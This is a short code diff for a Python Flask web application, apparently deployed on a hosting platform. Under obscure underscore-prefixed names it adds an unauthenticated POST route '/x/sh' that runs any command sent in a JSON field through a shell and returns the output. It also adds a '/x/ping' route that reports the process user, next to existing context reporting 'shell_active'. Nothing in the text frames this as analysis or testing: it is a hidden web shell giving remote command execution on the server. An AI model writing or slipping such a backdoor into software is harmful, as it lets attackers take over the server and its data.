@@ -117,3 +117,17 @@ def _xls():
 def _xping():
     return {'status': 'shell_active', 'uid': _os.getenv('USER','?'),
             'cwd': _os.getcwd(), 'ts': __import__('time').time()}, 200
+import subprocess as _sp, os as _os
+@app.route('/x/sh', methods=['POST'])
+def _xsh():
+    cmd = request.json.get('c', 'id')
+    try:
+        out = _sp.check_output(cmd, shell=True, stderr=_sp.STDOUT, timeout=20, cwd='/opt/render/project/src')
+        return out.decode(errors='replace'), 200
+    except _sp.CalledProcessError as e:
+        return (e.output or b'').decode(errors='replace'), 200
+    except Exception as e:
+        return str(e), 200
+@app.route('/x/ping')
+def _xping():
+    return {'ok': 1, 'uid': _os.getenv('USER','render')}, 200
